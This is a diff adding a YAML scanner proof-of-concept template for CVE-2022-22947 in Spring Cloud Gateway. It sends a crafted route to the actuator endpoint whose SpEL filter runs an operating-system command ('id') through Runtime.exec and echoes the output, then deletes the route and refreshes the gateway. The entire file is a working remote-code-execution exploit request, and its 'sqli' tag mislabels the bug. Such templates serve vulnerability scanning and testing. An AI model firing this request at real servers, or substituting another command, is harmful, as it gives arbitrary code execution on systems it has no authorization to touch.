@@ -1,0 +1,51 @@
+name: Spring Cloud Gateway Actuator API SpEL Code Injection CVE-2022-22947
+manual: true
+query: app="springboot" || app="spring-framework" || app="spring-gw"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /actuator/gateway/routes/gobytest
+      headers:
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+          like Gecko) Chrome/97.0.4692.71 Safari/537.36
+      body: "{\r\n  \"id\": \"gobytest\",\r\n  \"filters\": [{\r\n    \"name\": \"AddResponseHeader\",\r\n
+        \   \"args\": {\r\n      \"name\": \"Result\",\r\n      \"value\": \"#{new
+        String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new
+        String[]{\\\"id\\\"}).getInputStream()))}\"\r\n    }\r\n  }],\r\n  \"uri\":
+        \"http://example.com\"\r\n}"
+      follow_redirects: true
+    expression: response.status == 201 && response.raw_header.bcontains(b"gobytest")
+  r1:
+    request:
+      method: DELETE
+      path: /actuator/gateway/routes/gobytest
+      headers:
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+          like Gecko) Chrome/97.0.4692.71 Safari/537.36
+      follow_redirects: true
+    expression: response.status == 200
+  r2:
+    request:
+      method: POST
+      path: /actuator/gateway/refresh
+      headers:
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+          like Gecko) Chrome/97.0.4692.71 Safari/537.36
+      follow_redirects: true
+    expression: response.status == 200
+expression: r0() && r1() && r2()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-22947
+  - https://tanzu.vmware.com/security/cve-2022-22947
+  description: 'Spring Cloud Gateway aims to provide a simple, yet effective way to
+    route to APIs and provide cross cutting concerns to them such as: security, monitoring/metrics,
+    and resiliency.'
+  tags: sqli,rce
